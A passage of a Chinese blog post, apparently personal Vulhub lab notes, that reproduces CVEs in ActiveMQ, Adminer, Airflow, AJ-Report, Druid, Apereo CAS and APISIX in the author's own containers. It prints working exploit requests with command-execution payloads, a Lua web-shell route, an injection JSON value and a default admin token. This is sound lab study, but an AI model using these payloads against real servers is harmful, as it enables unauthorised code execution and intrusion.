href="poc.py">poc</a>脚本来复现完整的过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;python poc.py -u admin -p admin http://your-ip:8161</span><br></pre></td></tr></table></figure></blockquote><p><img src="8.jpg" alt="8"></p><blockquote><p>Webshell被写入在<code>/admin/shell.jsp</code>文件中：</p></blockquote><p><img src="9.jpg" alt="9"></p><blockquote><p>这个方法受到ActiveMQ版本的限制，因为Log4j2是在5.17.0中才引入Apache ActiveMQ。</p></blockquote><h1 id="Apache-ActiveMQ-OpenWire-协议反序列化命令执行漏洞（CVE-2023-46604）"><a href="#Apache-ActiveMQ-OpenWire-协议反序列化命令执行漏洞（CVE-2023-46604）" class="headerlink" title="Apache ActiveMQ OpenWire 协议反序列化命令执行漏洞（CVE-2023-46604）"></a>Apache ActiveMQ OpenWire 协议反序列化命令执行漏洞（CVE-2023-46604）</h1><blockquote><p>Apache ActiveMQ 是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。</p><p>OpenWire协议在ActiveMQ中被用于多语言客户端与服务端通信。在Apache ActiveMQ 5.18.2版本及以前，OpenWire协议通信过程中存在一处反序列化漏洞，该漏洞可以允许具有网络访问权限的远程攻击者通过操作 OpenWire 协议中的序列化类类型，导致代理的类路径上的任何类实例化，从而执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://activemq.apache.org/news/cve-2023-46604">https://activemq.apache.org/news/cve-2023-46604</a></li><li><a href="https://xz.aliyun.com/t/12929">https://xz.aliyun.com/t/12929</a></li><li><a href="https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/">https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/</a></li><li><a href="https://forum.butian.net/share/2566">https://forum.butian.net/share/2566</a></li></ul></blockquote><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先，启动一个HTTP反连服务器，其中包含我们的&lt;poc.xml&gt;：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 6666</span><br></pre></td></tr></table></figure><p>然后，执行&lt;poc.py&gt;，传入的三个参数分别是目标服务器地址、端口，以及包含poc.xml的反连平台URL：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 poc.py target port http://ip of http server/poc.xml</span><br></pre></td></tr></table></figure><p>执行完成后，进入ActiveMQ容器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec cve-2023-46604-activemq-1 ls -l /tmp</span><br></pre></td></tr></table></figure></blockquote><p><img src="11.jpg" alt="11"><br>使用python开启http反连服务器时,目录即为命令行的开启目录<br><img src="12.jpg" alt="12"></p><blockquote><p>可见，<code>touch /tmp/activeMQ-RCE-success</code>已经被成功执行：</p></blockquote><h1 id="Adminer-ElasticSearch-和-ClickHouse-错误页面SSRF漏洞（CVE-2021-21311）"><a href="#Adminer-ElasticSearch-和-ClickHouse-错误页面SSRF漏洞（CVE-2021-21311）" class="headerlink" title="Adminer ElasticSearch 和 ClickHouse 错误页面SSRF漏洞（CVE-2021-21311）"></a>Adminer ElasticSearch 和 ClickHouse 错误页面SSRF漏洞（CVE-2021-21311）</h1><blockquote><p>Adminer是一个PHP编写的开源数据库管理工具，支持MySQL、MariaDB、PostgreSQL、SQLite、MS SQL、Oracle、Elasticsearch、MongoDB等数据库。</p><p>在其4.0.0到4.7.9版本之间，连接 ElasticSearch 和 ClickHouse 数据库时存在一处服务端请求伪造漏洞（SSRF）。</p><p>参考连接：</p><ul><li><a href="https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6">https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6</a></li><li><a href="https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf">https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf</a></li><li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21311.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21311.yaml</a></li></ul></blockquote><h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>在Adminer登录页面，选择ElasticSearch作为系统目标，并在server字段填写<code>example.com</code>，点击登录即可看到<code>example.com</code>返回的400错误页面展示在页面中：</p></blockquote><p><img src="13.jpg" alt="13"></p><h1 id="Adminer远程文件读取（CVE-2021-43008）"><a href="#Adminer远程文件读取（CVE-2021-43008）" class="headerlink" title="Adminer远程文件读取（CVE-2021-43008）"></a>Adminer远程文件读取（CVE-2021-43008）</h1><blockquote><p>Adminer是一个PHP编写的开源数据库管理工具，支持MySQL、MariaDB、PostgreSQL、SQLite、MS SQL、Oracle、Elasticsearch、MongoDB等数据库。</p><p>在其版本1.12.0到4.6.2之间存在一处因为MySQL LOAD DATA LOCAL导致的文件读取漏洞。</p><p>参考链接：</p><ul><li><a href="https://github.com/p0dalirius/CVE-2021-43008-AdminerRead">https://github.com/p0dalirius/CVE-2021-43008-AdminerRead</a></li><li><a href="http://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability">http://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability</a></li></ul></blockquote><h2 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>使用<a href="https://github.com/4ra1n/mysql-fake-server">mysql-fake-server</a>启动一个恶意的MySQL服务器。在Adminer登录页面中填写恶意服务地址和用户名<code>fileread_/etc/passwd</code>：</p></blockquote><p><img src="15.jpg" alt="15"></p><p><img src="16.jpg" alt="16"></p><blockquote><p>可见，我们已经收到客户端连接，读取到的文件<code>/etc/passwd</code>已保存至当前目录：</p></blockquote><p>我这里怎么试都没法返回passwd文件…无奈放弃了<br><img src="17.jpg" alt="17"><br>看起来多半是文件为空导致无法返回 怪欸</p><h1 id="Apache-Airflow-示例dag中的命令注入（CVE-2020-11978）"><a href="#Apache-Airflow-示例dag中的命令注入（CVE-2020-11978）" class="headerlink" title="Apache Airflow 示例dag中的命令注入（CVE-2020-11978）"></a>Apache Airflow 示例dag中的命令注入（CVE-2020-11978）</h1><blockquote><p>Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前的示例DAG中存在一处命令注入漏洞，未授权的访问者可以通过这个漏洞在Worker中执行任意命令。</p><p>由于启动的组件比较多，可能会有点卡，运行此环境可能需要准备2G以上的内存。</p><p>参考链接：</p><ul><li><a href="https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx">https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx</a></li><li><a href="https://github.com/pberba/CVE-2020-11978">https://github.com/pberba/CVE-2020-11978</a></li></ul></blockquote><h2 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>访问<code>http://your-ip:8080</code>进入airflow管理端，将<code>example_trigger_target_dag</code>前面的Off改为On：</p></blockquote><p><img src="18.jpg" alt="18"></p><blockquote><p>再点击执行按钮，在Configuration JSON中输入：<code>&#123;&quot;message&quot;:&quot;&#39;\&quot;;touch /tmp/airflow_dag_success;#&quot;&#125;</code>，再点<code>Trigger</code>执行dag：</p></blockquote><p><img src="19.jpg" alt="19"><br><img src="20.jpg" alt="20"></p><blockquote><p>等几秒可以看到执行成功：<br>到CeleryWorker容器中进行查看：</p></blockquote><p><img src="21.jpg" alt="21"><br><img src="22.jpg" alt="22"></p><p>可以看到成功创建了airflow_dag_success</p><h1 id="Apache-Airflow-Celery-消息中间件命令执行（CVE-2020-11981）"><a href="#Apache-Airflow-Celery-消息中间件命令执行（CVE-2020-11981）" class="headerlink" title="Apache Airflow Celery 消息中间件命令执行（CVE-2020-11981）"></a>Apache Airflow Celery 消息中间件命令执行（CVE-2020-11981）</h1><blockquote><p>Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前，如果攻击者控制了Celery的消息中间件（如Redis&#x2F;RabbitMQ），将可以通过控制消息，在Worker进程中执行任意命令。</p><p>由于启动的组件比较多，可能会有点卡，运行此环境可能需要准备2G以上的内存。</p><p>参考链接：</p><ul><li><a href="https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx">https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx</a></li><li><a href="https://github.com/apache/airflow/pull/9178">https://github.com/apache/airflow/pull/9178</a></li></ul></blockquote><h2 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>利用这个漏洞需要控制消息中间件，Vulhub环境中Redis存在未授权访问。通过未授权访问，攻击者可以下发自带的任务<code>airflow.executors.celery_executor.execute_command</code>来执行任意命令，参数为命令执行中所需要的数组。<br>我们可以使用&lt;exploit_airflow_celery.py&gt;这个小脚本来执行命令<code>touch /tmp/airflow_celery_success</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install redis</span><br><span class="line">python exploit\_airflow\_celery.py [your-ip]</span><br></pre></td></tr></table></figure></blockquote><p><img src="23.jpg" alt="23"></p><blockquote><p>查看结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose logs airflow-worker</span><br></pre></td></tr></table></figure><p>可以看到如下任务消息：</p></blockquote><p><img src="24.jpg" alt="24"></p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;docker compose <span class="built_in">exec</span> airflow-worker <span class="built_in">ls</span> -l /tmp</span><br></pre></td></tr></table></figure><p>可以看到成功创建了文件<code>airflow_celery_success</code>：</p></blockquote><p><img src="25.jpg" alt="25"></p><h1 id="AJ-Report-认证绕过与远程代码执行漏洞（CNVD-2024-15077）"><a href="#AJ-Report-认证绕过与远程代码执行漏洞（CNVD-2024-15077）" class="headerlink" title="AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）"></a>AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）</h1><blockquote><p>AJ-Report是全开源的一个BI平台。在其1.4.0版本及以前，存在一处认证绕过漏洞，攻击者利用该漏洞可以绕过权限校验并执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://xz.aliyun.com/t/14460">https://xz.aliyun.com/t/14460</a></li><li><a href="https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md">https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md</a></li></ul></blockquote><h2 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>要利用该漏洞，只需要发送如下数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /dataSetParam/verification;swagger-ui/ HTTP/1.1</span><br><span class="line">Host: your-ip:9095</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 339</span><br><span class="line">&#123;&quot;ParamName&quot;:&quot;&quot;,&quot;paramDesc&quot;:&quot;&quot;,&quot;paramType&quot;:&quot;&quot;,&quot;sampleItem&quot;:&quot;1&quot;,&quot;mandatory&quot;:true,&quot;requiredFlag&quot;:1,&quot;validationRules&quot;:&quot;function verification(data)&#123;a = new java.lang.ProcessBuilder(\&quot;id\&quot;).start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss=&#x27;&#x27;;while((line = r.readLine()) != null)&#123;ss+=line&#125;;return ss;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></blockquote><p><img src="26.jpg" alt="26"><br>可见，<code>id</code>命令已经执行成功：</p><h1 id="Apache-Druid-代码执行漏洞（CVE-2021-25646）"><a href="#Apache-Druid-代码执行漏洞（CVE-2021-25646）" class="headerlink" title="Apache Druid 代码执行漏洞（CVE-2021-25646）"></a>Apache Druid 代码执行漏洞（CVE-2021-25646）</h1><blockquote><p>Apache Druid是一个开源的分布式数据存储。</p><p>Apache Druid包括执行嵌入在各种类型请求中的用户提供的JavaScript代码的能力。这个功能是为了在可信环境下使用，并且默认是禁用的。然而，在Druid 0.20.0及以前的版本中，攻击者可以通过发送一个恶意请求使Druid用内置引擎执行任意JavaScript代码，而不管服务器配置如何，这将导致代码和命令执行漏洞。</p><p>参考链接：</p><ul><li><a href="https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution">https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution</a></li><li><a href="https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw">https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw</a></li></ul></blockquote><h2 id="漏洞复现-8"><a href="#漏洞复现-8" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>直接发送如下请求即可执行其中的JavaScript代码：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">POST /druid/indexer/v1/sampler HTTP/1.1</span><br><span class="line">Host: your-ip:8888</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">&#123;</span><br><span class="line">&quot;type&quot;:&quot;index&quot;,</span><br><span class="line">&quot;spec&quot;:&#123;</span><br><span class="line">&quot;ioConfig&quot;:&#123;</span><br><span class="line">&quot;type&quot;:&quot;index&quot;,</span><br><span class="line">&quot;firehose&quot;:&#123;</span><br><span class="line">&quot;type&quot;:&quot;local&quot;,</span><br><span class="line">&quot;baseDir&quot;:&quot;/etc&quot;,</span><br><span class="line">&quot;filter&quot;:&quot;passwd&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;dataSchema&quot;:&#123;</span><br><span class="line">&quot;dataSource&quot;:&quot;test&quot;,</span><br><span class="line">&quot;parser&quot;:&#123;</span><br><span class="line">&quot;parseSpec&quot;:&#123;</span><br><span class="line">&quot;format&quot;:&quot;javascript&quot;,</span><br><span class="line">&quot;timestampSpec&quot;:&#123;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;dimensionsSpec&quot;:&#123;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;function&quot;:&quot;function()&#123;var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\&quot;sh\&quot;,\&quot;-c\&quot;,\&quot;id\&quot;]).getInputStream()).useDelimiter(\&quot;\\A\&quot;).next();return &#123;timestamp:123123,test: a&#125;&#125;&quot;,</span><br><span class="line">&quot;&quot;:&#123;</span><br><span class="line">&quot;enabled&quot;:&quot;true&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;samplerConfig&quot;:&#123;</span><br><span class="line">&quot;numRows&quot;:10</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="27.jpg" alt="27"><br>可见，<code>id</code>命令已被成功执行：</p><h1 id="Apereo-CAS-4-1-反序列化命令执行漏洞"><a href="#Apereo-CAS-4-1-反序列化命令执行漏洞" class="headerlink" title="Apereo CAS 4.1 反序列化命令执行漏洞"></a>Apereo CAS 4.1 反序列化命令执行漏洞</h1><blockquote><p>Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://apereo.github.io/2016/04/08/commonsvulndisc/">https://apereo.github.io/2016/04/08/commonsvulndisc/</a></li></ul></blockquote><h2 id="漏洞复现-9"><a href="#漏洞复现-9" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>漏洞原理实际上是Webflow中使用了默认密钥<code>changeit</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EncryptedTranscoder</span> <span class="keyword">implements</span> <span class="title class_">Transcoder</span> &#123;</span><br><span class="line"><span class="keyword">private</span> CipherBean cipherBean;</span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">compression</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">EncryptedTranscoder</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="type">BufferedBlockCipherBean</span> <span class="variable">bufferedBlockCipherBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedBlockCipherBean</span>();</span><br><span class="line">bufferedBlockCipherBean.setBlockCipherSpec(<span class="keyword">new</span> <span class="title class_">BufferedBlockCipherSpec</span>(<span class="string">&quot;AES&quot;</span>, <span class="string">&quot;CBC&quot;</span>, <span class="string">&quot;PKCS7&quot;</span>));</span><br><span class="line">bufferedBlockCipherBean.setKeyStore(<span class="built_in">this</span>.createAndPrepareKeyStore());</span><br><span class="line">bufferedBlockCipherBean.setKeyAlias(<span class="string">&quot;aes128&quot;</span>);</span><br><span class="line">bufferedBlockCipherBean.setKeyPassword(<span class="string">&quot;changeit&quot;</span>);</span><br><span class="line">bufferedBlockCipherBean.setNonce(<span class="keyword">new</span> <span class="title class_">RBGNonce</span>());</span><br><span class="line"><span class="built_in">this</span>.setCipherBean(bufferedBlockCipherBean);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>我们使用<a href="https://github.com/vulhub/Apereo-CAS-Attack">Apereo-CAS-Attack</a>来复现这个漏洞。使用ysoserial的CommonsCollections4生成加密后的Payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;touch /tmp/success&quot;</span><br></pre></td></tr></table></figure></blockquote><p><img src="28.jpg" alt="28"></p><blockquote><p>然后我们登录CAS并抓包，将Body中的<code>execution</code>值替换成上面生成的Payload发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /cas/login HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Content-Length: 2287</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://your-ip:8080</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://your-ip:8080/cas/login</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en,zh-CN;q=0.9,zh;q=0.8</span><br><span class="line">Cookie: JSESSIONID=24FB4BAAE1A66E8B76D521EE366B3E12; \_ga=GA1.1.1139210877.1586367734</span><br><span class="line">Connection: close</span><br><span class="line">username=test&amp;password=test&amp;lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&amp;execution=[payload]&amp;\_eventId=submit&amp;submit=LOGIN</span><br></pre></td></tr></table></figure></blockquote><p><img src="29.jpg" alt="29"></p><blockquote><p>登录Apereo CAS，可见<code>touch /tmp/success</code>已成功执行：</p></blockquote><p><img src="30.jpg" alt="30"></p><h1 id="Apache-APISIX-默认密钥漏洞（CVE-2020-13945）"><a href="#Apache-APISIX-默认密钥漏洞（CVE-2020-13945）" class="headerlink" title="Apache APISIX 默认密钥漏洞（CVE-2020-13945）"></a>Apache APISIX 默认密钥漏洞（CVE-2020-13945）</h1><blockquote><p>Apache APISIX是一个高性能API网关。在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token <code>edd1c9f034335f136f87ad84b625c8f1</code>，攻击者利用这个Token可以访问到管理员接口，进而通过<code>script</code>参数来插入任意LUA脚本并执行。</p><p>参考链接：</p><ul><li><a href="https://apisix.apache.org/docs/apisix/getting-started">https://apisix.apache.org/docs/apisix/getting-started</a></li><li><a href="https://github.com/apache/apisix/pull/2244">https://github.com/apache/apisix/pull/2244</a></li><li><a href="https://seclists.org/oss-sec/2020/q4/187">https://seclists.org/oss-sec/2020/q4/187</a></li></ul></blockquote><h2 id="漏洞复现-10"><a href="#漏洞复现-10" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>利用默认Token增加一个恶意的router，其中包含恶意LUA脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /apisix/admin/routes HTTP/1.1</span><br><span class="line">Host: your-ip:9080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">X-API-KEY: edd1c9f034335f136f87ad84b625c8f1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 406</span><br><span class="line">&#123;</span><br><span class="line">&quot;uri&quot;: &quot;/attack&quot;,</span><br><span class="line">&quot;script&quot;: &quot;local \_M = &#123;&#125; \n function \_M.access(conf, ctx) \n local os = require(&#x27;os&#x27;)\n local args = assert(ngx.req.get\_uri\_args()) \n local f = assert(io.popen(args.cmd, &#x27;r&#x27;))\n local s = assert(f:read(&#x27;\*a&#x27;))\n ngx.say(s)\n f:close() \n end \nreturn \_M&quot;,</span><br><span class="line">&quot;upstream&quot;: &#123;</span><br><span class="line">&quot;type&quot;: &quot;roundrobin&quot;,</span><br><span class="line">&quot;nodes&quot;: &#123;</span><br><span class="line">&quot;example.com:80&quot;: 1</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p><img src="31.jpg" alt="31"></p><blockquote><p>然后，我们访问刚才添加的router，就可以通过cmd参数执行任意命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:9080/attack?cmd=id</span><br></pre></td></tr></table></figure></blockquote><p><img src="32.jpg" alt="32"></p><h1 id="Apache-APISIX-Dashboard-API权限绕过导致RCE（CVE-2021-45232）-未完成"><a href="#Apache-APISIX-Dashboard-API权限绕过导致RCE（CVE-2021-45232）-未完成" class="headerlink" title="Apache APISIX Dashboard API权限绕过导致RCE（CVE-2021-45232）(未完成)"></a>Apache APISIX Dashboard API权限绕过导致RCE（CVE-2021-45232）(未完成)</h1><blockquote><p>Apache APISIX是一个动态、实时、高性能API网关，而Apache APISIX Dashboard是一个配套的前端面板。</p><p>Apache APISIX Dashboard 2.10.1版本前存在两个API<code>/apisix/admin/migrate/export</code>和<code>/apisix/admin/migrate/import</code>，他们没有经过<code>droplet</code>框架的权限验证，导致未授权的攻击者可以导出、导入当前网关的所有配置项，包括路由、服务、脚本等。攻击者通过导入恶意路由，可以用来让Apache APISIX访问任意网站，甚至执行LUA脚本。</p><p>参考链接：</p><ul><li><a href="https://apisix.apache.org/zh/blog/2021/12/28/dashboard-cve-2021-45232/">https://apisix.apache.org/zh/blog/2021/12/28/dashboard-cve-2021-45232/</a></li><li><a href="https://github.com/wuppp/cve-2021-45232-exp">https://github.com/wuppp/cve-2021-45232-exp</a></li></ul></blockquote><h2 id="漏洞复现-11"><a href="#漏洞复现-11" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先用默认账号密码admin&#x2F;vulhub来登录网站<br><img src="33.jpg" alt="33"><br>注:默认账号密码可能会因为镜像版本不同而有变化 具体还请查看容器目录下的comfig.yaml</p><p>登陆完之后进入路由页面 新建一个路由<br><img src="34.jpg" alt="34"><br><img src="35.jpg" alt="35"><br>至于相关设置直接随意 快速下一步到创建就行了<br>在访问了网站的<code>/apisix/admin/migrate/export</code>目录后获取了一个bak文件 查看后可以发现我们刚刚配置的路由信息被泄露了<img src="36.jpg" alt="36"><br>剩下的过程不好复现 先暂且跳过</p><h1 id="AppWeb认证绕过漏洞（CVE-2018-8715"><a href="#AppWeb认证绕过漏洞（CVE-2018-8715" class="headerlink" title="AppWeb认证绕过漏洞（CVE-2018-8715)"></a>AppWeb认证绕过漏洞（CVE-2018-8715)</h1><blockquote><p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C&#x2F;C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p><p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p><ul><li>basic 传统HTTP基础认证</li><li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li><li>form 表单认证</li></ul><p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p><p>参考链接：</p><ul><li><a href="https://ssd-disclosure.com/index.php/archives/3676">https://ssd-disclosure.com/index.php/archives/3676</a></li></ul></blockquote><h2 id="漏洞复现-12"><a href="#漏洞复现-12" class="headerlink" 